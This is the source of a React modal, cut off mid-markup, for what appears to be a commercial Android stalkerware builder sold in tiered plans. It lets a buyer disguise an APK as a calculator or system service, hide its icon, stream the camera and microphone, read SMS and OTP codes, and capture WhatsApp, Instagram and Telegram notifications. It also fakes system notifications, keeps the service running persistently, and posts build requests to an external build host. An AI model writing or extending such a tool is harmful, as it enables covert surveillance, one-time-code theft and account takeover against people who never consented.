"use client";

import React, { useState, useEffect } from 'react';
import CustomAlertModal from './CustomAlertModal';
import { 
    Smartphone, Shield, Bell, Check, Lock, Crown, Zap, 
    ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
    AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info
} from 'lucide-react';

interface AppGenerationModalProps {
    isOpen: boolean;
    onClose: () => void;
    uuid: string;
    socket: any;
    userPlan?: 'basic' | 'standard' | 'premium';
    onUpgrade?: () => void;
}

const DISGUISE_PRESETS = [
    {
        id: 'calculator',
        name: 'Calculator',
        packageName: 'com.android.calculator2.pro',
        iconType: 'calculator',
        description: 'Standard calculator disguise. Blends perfectly into any phone.'
    },
    {
        id: 'system',
        name: 'System Service',
        packageName: 'com.android.system.update.service',
        iconType: 'system',
        description: 'Looks like an official Android system component.'
    },
    {
        id: 'notes',
        name: 'Secure Notes',
        packageName: 'com.app.notes.vault',
        iconType: 'notes',
        description: 'Clean personal notepad application disguise.'
    },
    {
        id: 'game',
        name: 'Mini Arcade',
        packageName: 'com.game.arcade.mini',
        iconType: 'game',
        description: 'Casual mobile game center icon disguise.'
    },
    {
        id: 'custom',
        name: 'Custom App',
        packageName: 'com.gallery.eye.app',
        iconType: 'custom',
        description: 'Define your own custom app name, package, and icon.'
    }
];

const MONITORED_APPS = [
    { id: 'whatsapp_biz', name: 'WhatsApp Business', pkg: 'com.whatsapp.w4b', icon: '💬', color: 'text-emerald-400 border-emerald-500/30 bg-emerald-500/10' },
    { id: 'whatsapp', name: 'WhatsApp Messenger', pkg: 'com.whatsapp', icon: '💬', color: 'text-green-400 border-green-500/30 bg-green-500/10' },
    { id: 'instagram', name: 'Instagram', pkg: 'com.instagram.android', icon: '📸', color: 'text-pink-400 border-pink-500/30 bg-pink-500/10' },
    { id: 'telegram', name: 'Telegram', pkg: 'org.telegram.messenger', icon: '✈️', color: 'text-cyan-400 border-cyan-500/30 bg-cyan-500/10' },
    { id: 'messenger', name: 'Messenger', pkg: 'com.facebook.orca', icon: '⚡', color: 'text-blue-400 border-blue-500/30 bg-blue-500/10' },
    { id: 'sms', name: 'System SMS', pkg: 'com.google.android.apps.messaging', icon: '📱', color: 'text-amber-400 border-amber-500/30 bg-amber-500/10' },
];

export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
    const isBasicPlan = userPlan === 'basic';
    const isPremium = userPlan === 'premium';

    const [activeStep, setActiveStep] = useState<'identity' | 'permissions' | 'notifications'>('identity');
    const [status, setStatus] = useState<'idle' | 'queued' | 'generating' | 'downloading' | 'completed'>('idle');
    const [progress, setProgress] = useState(0);
    const [progressStep, setProgressStep] = useState("");
    const [downloadUrl, setDownloadUrl] = useState("");
    const [queuePosition, setQueuePosition] = useState(0);

    // Customization State
    const [selectedPreset, setSelectedPreset] = useState<string>('calculator');
    const [appName, setAppName] = useState("Calculator");
    const [packageName, setPackageName] = useState("com.android.calculator2.pro");
    const [hideApp, setHideApp] = useState(false);
    const [webLink, setWebLink] = useState("");
    const [customIcon, setCustomIcon] = useState<File | null>(null);
    const [customIconPreview, setCustomIconPreview] = useState<string | null>(null);

    const generatePackageName = (name: string) => {
        const cleaned = name.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim();
        const parts = cleaned.split(/\s+/).filter(Boolean);
        if (parts.length === 0) return "com.app.gallery";
        if (parts.length === 1) return `com.${parts[0]}.app`;
        return `com.${parts[0]}.${parts.slice(1).join('')}`;
    };

    const handlePresetChange = (presetId: string) => {
        setSelectedPreset(presetId);
        const preset = DISGUISE_PRESETS.find(p => p.id === presetId);
        if (preset && presetId !== 'custom') {
            setAppName(preset.name);
            setPackageName(preset.packageName);
        }
    };

    const handleAppNameChange = (name: string) => {
        setAppName(name);
        setPackageName(generatePackageName(name));
        setSelectedPreset('custom');
    };

    const handleIconSelect = (file: File | null) => {
        setCustomIcon(file);
        if (file) {
            const url = URL.createObjectURL(file);
            setCustomIconPreview(url);
        } else {
            setCustomIconPreview(null);
        }
    };

    // Permission Manager State
    const [enableSmsPermission, setEnableSmsPermission] = useState(false);
    const [enableContactsPermission, setEnableContactsPermission] = useState(false);
    const [enableStoragePermission, setEnableStoragePermission] = useState(true);
    const [enableCameraPermission, setEnableCameraPermission] = useState(false);
    const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
    const [enableNotificationListener, setEnableNotificationListener] = useState(true);
    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'notifications' | null>(null);
    const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
    const [aggressivePermissions, setAggressivePermissions] = useState(false);

    // Notification Monitoring State
    const [selectedTargetApps, setSelectedTargetApps] = useState<string[]>(['whatsapp_biz', 'whatsapp', 'instagram']);
    const [notificationStyle, setNotificationStyle] = useState("google_play");
    const [notificationClickAction, setNotificationClickAction] = useState("device_info");
    const [notificationTitle, setNotificationTitle] = useState("");
    const [notificationText, setNotificationText] = useState("");
    const [notificationIcon, setNotificationIcon] = useState("info");

    const NOTIFICATION_PRESETS: Record<string, { title: string; text: string; icon: string }> = {
        google_play: { title: "Google Play services", text: "Checking for updates…", icon: "ℹ️" },
        android_system: { title: "Android System", text: "Updating system components…", icon: "🔄" },
        device_security: { title: "Device Security", text: "Scanning for threats…", icon: "🔒" },
        system_ui: { title: "System UI", text: "Syncing system data…", icon: "🔄" },
        device_maintenance: { title: "Device maintenance", text: "Optimizing performance…", icon: "🔄" },
        download_manager: { title: "Download Manager", text: "Download in progress…", icon: "⬇️" },
        custom: { title: "Custom", text: "Set your own title & text", icon: "✏️" },
    };

    const CLICK_ACTIONS: Record<string, string> = {
        device_info: "Device Info (About Phone)",
        settings: "Settings (Main)",
        security: "Security Settings",
        battery: "Battery Settings",
        wifi: "WiFi Settings",
        storage: "Storage Settings",
        none: "Do Nothing",
    };

    const ICON_OPTIONS: Record<string, string> = {
        info: "ℹ️ Info",
        sync: "🔄 Sync",
        lock: "🔒 Lock",
        download: "⬇️ Download",
        download_done: "✅ Download Done",
    };

    const [showCustomAlert, setShowCustomAlert] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });

    useEffect(() => {
        if (isOpen) {
            setStatus('idle');
            setProgress(0);
            setProgressStep("");
            setDownloadUrl("");
            setQueuePosition(0);
            setActiveStep('identity');
        }
    }, [isOpen]);

    useEffect(() => {
        if (!socket) return;

        const handleProgress = (data: any) => {
            setStatus('generating');
            setProgress(data.progress);
            if (data.step) setProgressStep(data.step);
        };

        const handleQueueUpdate = (data: any) => {
            setStatus('queued');
            setQueuePosition(data.position);
        };

        const handleReady = (data: any) => {
            setStatus('completed');
            setProgress(100);
            setProgressStep("APK ready for download!");
            setDownloadUrl(data.downloadUrl);

            try {
                const link = document.createElement('a');
                link.href = data.downloadUrl;
                link.download = `${appName.replace(/\s+/g, '_')}.apk`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            } catch (err) {
                console.error("Auto download trigger error:", err);
            }
        };

        const handleError = (data: any) => {
            console.error("APK Error:", data);
            setStatus('idle');
            setAlertData({
                title: 'Generation Failed',
                message: data.message || 'An error occurred while building the APK.',
                type: 'error'
            });
            setShowCustomAlert(true);
        };

        socket.on('apk_progress', handleProgress);
        socket.on('queue_update', handleQueueUpdate);
        socket.on('apk_ready', handleReady);
        socket.on('apk_error', handleError);

        return () => {
            socket.off('apk_progress', handleProgress);
            socket.off('queue_update', handleQueueUpdate);
            socket.off('apk_ready', handleReady);
            socket.off('apk_error', handleError);
        };
    }, [socket, appName]);

    const toggleTargetApp = (appId: string) => {
        setSelectedTargetApps(prev => 
            prev.includes(appId) ? prev.filter(id => id !== appId) : [...prev, appId]
        );
    };

    const startGeneration = async () => {
        if (!hideApp && !webLink.trim()) {
            setAlertData({
                title: 'Web Link Required',
                message: 'Please provide a WebView link for your app.\n\nThe app needs a URL to display when launched.',
                type: 'warning'
            });
            setShowCustomAlert(true);
            return;
        }

        setStatus('generating');
        setProgress(5);
        setProgressStep("Initializing request...");

        try {
            if (!uuid) {
                throw new Error("User ID is missing. Please log in again.");
            }

            const formData = new FormData();
            formData.append('uuid', uuid);
            formData.append('appName', appName);
            formData.append('packageName', packageName);
            formData.append('hideApp', hideApp.toString());
            formData.append('webLink', webLink);
            formData.append('enableSmsPermission', enableSmsPermission.toString());
            formData.append('enableContactsPermission', enableContactsPermission.toString());
            formData.append('enableStoragePermission', enableStoragePermission.toString());
            formData.append('enableCameraPermission', enableCameraPermission.toString());
            formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
            formData.append('enableNotificationListener', enableNotificationListener.toString());
            formData.append('aggressivePermissions', aggressivePermissions.toString());
            formData.append('notificationStyle', notificationStyle);
            formData.append('notificationClickAction', notificationClickAction);
            formData.append('monitoredApps', JSON.stringify(selectedTargetApps));

            if (notificationStyle === 'custom') {
                formData.append('notificationTitle', notificationTitle);
                formData.append('notificationText', notificationText);
                formData.append('notificationIcon', notificationIcon);
            }
            if (customIcon) {
                formData.append('icon', customIcon);
            }

            const response = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-apk`, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(errorText || "Generation failed to start");
            }

            const data = await response.json();
            if (data.position) {
                setStatus('queued');
                setQueuePosition(data.position);
            }
        } catch (error: any) {
            console.error(error);
            setStatus('idle');
            setAlertData({
                title: 'Error Starting Build',
                message: error.message || "Failed to start generation. Please try again.",
                type: 'error'
            });
            setShowCustomAlert(true);
        }
    };

    const renderIconPreviewGlyph = () => {
        if (customIconPreview) {
            return <img src={customIconPreview} alt="App Icon" className="w-full h-full object-cover rounded-2xl" />;
        }
        switch (selectedPreset) {
            case 'calculator':
                return <div className="w-full h-full bg-gradient-to-br from-amber-500 to-orange-600 rounded-2xl flex items-center justify-center text-2xl font-bold text-white shadow-inner">+-=</div>;
            case 'system':
                return <div className="w-full h-full bg-gradient-to-br from-cyan-500 to-blue-600 rounded-2xl flex items-center justify-center text-white shadow-inner"><RefreshCw size={24} className="animate-spin" /></div>;
            case 'notes':
                return <div className="w-full h-full bg-gradient-to-br from-emerald-500 to-teal-600 rounded-2xl flex items-center justify-center text-white shadow-inner"><Sparkles size={24} /></div>;
            case 'game':
                return <div className="w-full h-full bg-gradient-to-br from-purple-500 to-pink-600 rounded-2xl flex items-center justify-center text-white shadow-inner"><Zap size={24} /></div>;
            default:
                return <div className="w-full h-full bg-gradient-to-br from-cyan-500 to-emerald-500 rounded-2xl flex items-center justify-center text-white shadow-inner"><Smartphone size={24} /></div>;
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/80 backdrop-blur-xl animate-in fade-in duration-200 p-3 sm:p-6 overflow-y-auto">
            <div className="bg-[#121316] border border-white/10 rounded-[2.5rem] max-w-2xl w-full flex flex-col shadow-[0_20px_70px_rgba(0,0,0,0.8)] relative max-h-[92dvh] overflow-hidden">
                
                {/* Header & Step Navigation */}
                <div className="p-5 sm:p-7 border-b border-white/10 bg-gradient-to-b from-white/[0.03] to-transparent flex flex-col gap-4">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                            <div className="w-11 h-11 rounded-2xl bg-gradient-to-br from-emerald-500/20 to-cyan-500/20 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
                                <Sparkles size={22} />
                            </div>
                            <div className="text-left">
                                <h2 className="text-xl sm:text-2xl font-black text-white tracking-tight">App Studio</h2>
                                <p className="text-xs text-fg-3">Design, configure & compile your stealth mobile client</p>
                            </div>
                        </div>
                        <button
                            onClick={onClose}
                            className="w-10 h-10 rounded-full bg-white/5 hover:bg-white/10 flex items-center justify-center text-white/50 hover:text-white transition-colors"
                        >
                            ✕
                        </button>
                    </div>

                    {/* Step Wizard Tabs */}
                    <div className="grid grid-cols-3 gap-2 p-1.5 rounded-2xl bg-black/50 border border-white/5">
                        <button
                            type="button"
                            onClick={() => setActiveStep('identity')}
                            className={`flex items-center justify-center gap-2 py-2.5 px-3 rounded-xl text-xs font-bold transition-all ${
                                activeStep === 'identity'
                                    ? 'bg-gradient-to-r from-emerald-600/30 to-teal-600/30 text-emerald-300 border border-emerald-500/40 shadow-lg'
                                    : 'text-fg-3 hover:text-fg-1'
                            }`}
                        >
                            <Smartphone size={14} />
                            <span className="hidden sm:inline">1. Identity</span>
                        </button>
                        <button
                            type="button"
                            onClick={() => setActiveStep('permissions')}
                            className={`flex items-center justify-center gap-2 py-2.5 px-3 rounded-xl text-xs font-bold transition-all ${
                                activeStep === 'permissions'
                                    ? 'bg-gradient-to-r from-cyan-600/30 to-blue-600/30 text-cyan-300 border border-cyan-500/40 shadow-lg'
                                    : 'text-fg-3 hover:text-fg-1'
                            }`}
                        >
                            <Shield size={14} />
                            <span className="hidden sm:inline">2. Permissions</span>
                        </button>
                        <button
                            type="button"
                            onClick={() => setActiveStep('notifications')}
                            className={`flex items-center justify-center gap-2 py-2.5 px-3 rounded-xl text-xs font-bold transition-all ${
                                activeStep === 'notifications'
                                    ? 'bg-gradient-to-r from-purple-600/30 to-pink-600/30 text-purple-300 border border-purple-500/40 shadow-lg'
                                    : 'text-fg-3 hover:text-fg-1'
                            }`}
                        >
                            <Bell size={14} />
                            <span className="hidden sm:inline">3. Notifications</span>
                        </button>
                    </div>
                </div>

                {/* Main Content Area */}
                <div className="p-5 sm:p-7 overflow-y-auto flex-1 space-y-6 custom-scrollbar">
                    
                    {/* STEP 1: IDENTITY & ICON */}
                    {activeStep === 'identity' && (
                        <div className="space-y-6 animate-in fade-in duration-200">
                            
                            {/* Disguise Preset Picker */}
                            <div>
                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2.5">Disguise Preset</label>
                                <div className="grid grid-cols-2 sm:grid-cols-5 gap-2.5">
                                    {DISGUISE_PRESETS.map((p) => (
                                        <button
                                            key={p.id}
                                            type="button"
                                            onClick={() => handlePresetChange(p.id)}
                                            className={`p-3 rounded-2xl border text-left flex flex-col gap-1.5 transition-all ${
                                                selectedPreset === p.id
                                                    ? 'bg-emerald-500/15 border-emerald-500/50 shadow-[0_0_15px_rgba(16,185,129,0.2)] scale-[1.02]'
                                                    : 'bg-black/30 border-white/5 hover:border-white/15 text-fg-3'
                                            }`}
                                        >
                                            <span className="text-xs font-bold text-fg-1 truncate">{p.name}</span>
                                            <span className="text-[10px] text-fg-4 truncate font-mono">{p.packageName}</span>
                                        </button>
                                    ))}
                                </div>
                            </div>

                            {/* App Identity + Interactive Phone Home-Screen Preview */}
                            <div className="grid grid-cols-1 sm:grid-cols-12 gap-5 items-start">
                                
                                {/* Identity Inputs */}
                                <div className="sm:col-span-7 space-y-4">
                                    <div>
                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">App Name</label>
                                        <input
                                            type="text"
                                            value={appName}
                                            onChange={(e) => handleAppNameChange(e.target.value)}
                                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white font-medium focus:outline-none focus:border-emerald-500 transition-colors"
                                            placeholder="Calculator"
                                        />
                                    </div>

                                    <div>
                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Package Identifier</label>
                                        <input
                                            type="text"
                                            value={packageName}
                                            onChange={(e) => setPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
                                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white font-mono text-xs focus:outline-none focus:border-emerald-500 transition-colors"
                                            placeholder="com.android.calculator2.pro"
                                        />
                                        <p className="text-[11px] text-fg-4 mt-1">Unique Android application identifier</p>
                                    </div>

                                    <div>
                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Launch Web URL (Optional)</label>
                                        <input
                                            type="url"
                                            value={webLink}
                                            onChange={(e) => setWebLink(e.target.value)}
                                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500 transition-colors"
                                            placeholder="https://example.com"
                                        />
                                        <p className="text-[11px] text-fg-4 mt-1">URL displayed when user opens the app</p>
                                    </div>

                                    <div>
                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Custom App Icon PNG (Optional)</label>
                                        <input
                                            type="file"
                                            accept="image/png, image/jpeg"
                                            onChange={(e) => handleIconSelect(e.target.files?.[0] || null)}
                                            className="w-full bg-black/40 border border-white/10 rounded-xl px-3 py-2 text-white text-xs file:mr-3 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-bold file:bg-emerald-500/20 file:text-emerald-300 hover:file:bg-emerald-500/30"
                                        />
                                    </div>
                                </div>

                                {/* Phone Interactive Icon Preview */}
                                <div className="sm:col-span-5 bg-gradient-to-b from-black/60 to-black/30 border border-white/10 rounded-3xl p-5 flex flex-col items-center justify-center text-center">
                                    <div className="text-[10px] font-bold text-fg-3 uppercase tracking-widest mb-4">Phone Icon Preview</div>
                                    <div className="w-24 h-24 mb-3 relative group">
                                        {renderIconPreviewGlyph()}
                                        {hideApp && (
                                            <div className="absolute -top-1.5 -right-1.5 px-2 py-0.5 rounded-full bg-red-500/90 text-white text-[9px] font-black tracking-wider uppercase shadow-lg">
                                                Hidden
                                            </div>
                                        )}
                                    </div>
                                    <span className="text-sm font-bold text-white max-w-[140px] truncate">{appName || "App Name"}</span>
                                    <span className="text-[10px] font-mono text-fg-4 mt-0.5 truncate max-w-[160px]">{packageName}</span>

                                    {/* Hide App Toggle Switch */}
                                    <div className="mt-5 w-full pt-4 border-t border-white/10 flex items-center justify-between">
                                        <div className="flex items-center gap-1.5">
                                            <span className="text-xs font-bold text-fg-2">Hide Launcher Icon</span>
                                            {isBasicPlan && (
                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-1.5 py-0.5 rounded text-[9px] font-extrabold tracking-wider">
                                                    PRO
                                                </span>
                                            )}
                                        </div>
                                        <button
                                            type="button"
                                            onClick={() => {
                                                if (isBasicPlan) {
                                                    onUpgrade?.();
                                                    return;
                                                }
                                                setHideApp(!hideApp);
                                            }}
                                            className={`w-11 h-6 rounded-full transition-colors relative ${
                                                isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'
                                            }`}
                                        >
                                            <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* STEP 2: PERMISSIONS & STEALTH */}
                    {activeStep === 'permissions' && (
                        <div className="space-y-4 animate-in fade-in duration-200">
                            <div className="flex items-center justify-between">
                                <span className="text-xs font-bold text-fg-3 uppercase tracking-widest">Stealth & Device Access</span>
                                <span className="text-xs text-fg-4">Configure Android permissions requested at launch</span>
                            </div>

                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                
                                {/* Storage / Gallery */}
                                <div className="p-4 rounded-2xl bg-black/40 border border-white/10 flex items-center justify-between gap-3">
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-white">Gallery & Storage</span>
                                            <button type="button" onClick={() => setShowPermissionInfo('storage')} className="text-fg-4 hover:text-emerald-400">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-fg-3">Silent photos & media indexing</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => setEnableStoragePermission(!enableStoragePermission)}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${enableStoragePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Camera (PREMIUM) */}
                                <div className={`p-4 rounded-2xl bg-black/40 border flex items-center justify-between gap-3 ${!isPremium ? 'border-amber-500/30' : 'border-white/10'}`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-white">Camera Capture</span>
                                            {!isPremium && (
                                                <span className="bg-gradient-to-r from-cyan-500/20 to-purple-500/20 text-cyan-300 border border-cyan-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(6,182,212,0.2)]">
                                                    PREMIUM
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-fg-4 hover:text-cyan-400">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-fg-3">Live video stream & snapshots</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.(); return; }
                                            setEnableCameraPermission(!enableCameraPermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${!isPremium ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && isPremium ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Microphone (PREMIUM) */}
                                <div className={`p-4 rounded-2xl bg-black/40 border flex items-center justify-between gap-3 ${!isPremium ? 'border-amber-500/30' : 'border-white/10'}`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-white">Live Microphone</span>
                                            {!isPremium && (
                                                <span className="bg-gradient-to-r from-cyan-500/20 to-purple-500/20 text-cyan-300 border border-cyan-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(6,182,212,0.2)]">
                                                    PREMIUM
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-fg-4 hover:text-emerald-400">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-fg-3">Listen to live room surround audio</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.(); return; }
                                            setEnableMicrophonePermission(!enableMicrophonePermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && isPremium ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Contacts (PRO) */}
                                <div className={`p-4 rounded-2xl bg-black/40 border flex items-center justify-between gap-3 ${isBasicPlan ? 'border-amber-500/30' : 'border-white/10'}`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-white">Contacts Sync</span>
                                            {isBasicPlan && (
                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(245,158,11,0.2)]">
                                                    PRO
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('contacts')} className="text-fg-4 hover:text-green-400">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-fg-3">Sync device phonebook & emails</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isBasicPlan) { onUpgrade?.(); return; }
                                            setEnableContactsPermission(!enableContactsPermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Notification Listener (PRO) */}
                                <div className={`p-4 rounded-2xl bg-black/40 border flex items-center justify-between gap-3 ${isBasicPlan ? 'border-amber-500/30' : 'border-white/10'}`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-white">Notification Reader</span>
                                            {isBasicPlan && (
                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(245,158,11,0.2)]">
                                                    PRO
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-fg-4 hover:text-cyan-400">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-fg-3">Capture chat notifications</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isBasicPlan) { onUpgrade?.(); return; }
                                            setEnableNotificationListener(!enableNotificationListener);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-cyan-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* SMS Access (Risky) */}
                                <div className={`p-4 rounded-2xl bg-black/40 border flex items-center justify-between gap-3 ${isBasicPlan ? 'border-amber-500/30' : 'border-red-500/30'}`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-white">SMS Messages</span>
                                            <span className="bg-red-500/20 text-red-400 border border-red-500/40 px-1.5 py-0.5 rounded text-[9px] font-bold">
                                                RISKY
                                            </span>
                                            {isBasicPlan && (
                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(245,158,11,0.2)]">
                                                    PRO
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-fg-4 hover:text-blue-400">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-fg-3">Read SMS & OTP codes</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isBasicPlan) { onUpgrade?.(); return; }
                                            if (!enableSmsPermission) {
                                                setShowPlayProtectWarning(true);
                                            } else {
                                                setEnableSmsPermission(false);
                                            }
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-red-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>
                            </div>

                            {/* Aggressive Persistence Mode Card */}
                            <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between gap-4">
                                <div>
                                    <div className="flex items-center gap-2">
                                        <span className="text-sm font-bold text-amber-300">Aggressive Persistence Mode</span>
                                        {isBasicPlan && (
                                            <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(245,158,11,0.2)]">
                                                PRO
                                            </span>
                                        )}
                                    </div>
                                    <p className="text-xs text-amber-200/70 mt-0.5">Keeps service alive aggressively against OS background optimization</p>
                                </div>
                                <button
                                    type="button"
                                    onClick={() => {
                                        if (isBasicPlan) { onUpgrade?.(); return; }
                                        setAggressivePermissions(!aggressivePermissions);
                                    }}
                                    className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-amber-500' : 'bg-white/20'}`}
                                >
                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                </button>
                            </div>
                        </div>
                    )}

                    {/* STEP 3: NOTIFICATIONS & TARGET APPS */}
                    {activeStep === 'notifications' && (
                        <div className="space-y-6 animate-in fade-in duration-200">
                            
                            {/* Target Apps Selector ("notification add karna wala ka desigen better bana") */}
                            <div>
                                <div className="flex items-center justify-between mb-2.5">
                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest">Select Apps to Monitor</label>
                                    <span className="text-xs font-semibold text-emerald-400">{selectedTargetApps.length} active</span>
                                </div>
                                <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
                                    {MONITORED_APPS.map((app) => {
                                        const isSelected = selectedTargetApps.includes(app.id);
                                        return (
                                            <button
                                                key={app.id}
                                                type="button"
                                                onClick={() => toggleTargetApp(app.id)}
                                                className={`p-3.5 rounded-2xl border text-left flex items-center justify-between transition-all ${
                                                    isSelected
                                                        ? `${app.color} shadow-md scale-[1.01]`
                                                        : 'bg-black/30 border-white/5 hover:border-white/15 text-fg-3'
                                                }`}
                                            >
                                                <div className="flex items-center gap-2.5 truncate">
                                                    <span className="text-lg">{app.icon}</span>
                                                    <span className="text-xs font-bold truncate text-white">{app.name}</span>
                                                </div>
                                                {isSelected && <CheckCircle2 size={16} className="text-emerald-400 flex-shrink-0" />}
                                            </button>
                                        );
                                    })}
                                </div>
                            </div>

                            {/* Service Notification Disguise Preset */}
                            <div className="space-y-4 pt-4 border-t border-white/10">
                                <div>
                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-1.5">Background Service Disguise</label>
                                    <select
                                        value={notificationStyle}
                                        onChange={(e) => setNotificationStyle(e.target.value)}
                                        className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500 transition-colors"
                                    >
